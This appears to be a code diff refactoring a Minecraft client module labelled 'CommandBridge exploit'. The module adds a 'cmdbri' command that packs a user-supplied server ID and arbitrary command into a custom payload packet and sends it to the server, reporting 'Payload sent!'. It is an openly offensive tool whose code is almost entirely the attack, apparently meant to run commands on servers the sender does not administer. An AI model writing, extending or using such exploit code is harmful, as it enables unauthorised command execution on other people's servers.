@@ -1,6 +1,5 @@
 package net.paradise_client.command.impl;
 
-import com.mojang.brigadier.arguments.ArgumentType;
 import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import com.mojang.brigadier.builder.RequiredArgumentBuilder;
@@ -12,24 +11,34 @@ import net.minecraft.client.MinecraftClient;
 import net.paradise_client.command.Command;
 import net.paradise_client.packet.CommandBridgePacket;
 
+import static com.mojang.brigadier.builder.RequiredArgumentBuilder.argument;
+
 public class CommandBridge extends Command {
-    public CommandBridge(MinecraftClient minecraftClient) {
-        super("cmdbri", "CommandBridge exploit", minecraftClient);
+
+    public CommandBridge() {
+        super("cmdbri", "CommandBridge exploit");
     }
 
     @Override
-    public LiteralArgumentBuilder<CommandSource> build() {
-        return (CommandBridge.literal(this.getName()).executes(this::incomplete)).then((CommandBridge.argument("serverID", StringArgumentType.string()).executes(this::incomplete)).then(CommandBridge.argument("command", StringArgumentType.greedyString()).executes(this::sendPayload)));
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
+        root
+            .then(argument("serverID", StringArgumentType.string())
+            .then(argument("command", StringArgumentType.greedyString())
+            .executes(this::sendPayload)))
+            .executes(this::incomplete);
     }
 
     private int sendPayload(CommandContext<?> context) {
-        Helper.sendPacket(new CustomPayloadC2SPacket(new CommandBridgePacket(context.getArgument("command", String.class), context.getArgument("serverID", String.class))));
+        String command = context.getArgument("command", String.class);
+        String serverID = context.getArgument("serverID", String.class);
+        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new CommandBridgePacket(command, serverID));
+        Helper.sendPacket(packet);
         Helper.printChatMessage("Payload sent!");
-        return 1;
+        return SINGLE_SUCCESS;
     }
 
     private int incomplete(CommandContext<?> context) {
         Helper.printChatMessage("Incomplete command!");
-        return 1;
+        return SINGLE_SUCCESS;
     }
 }
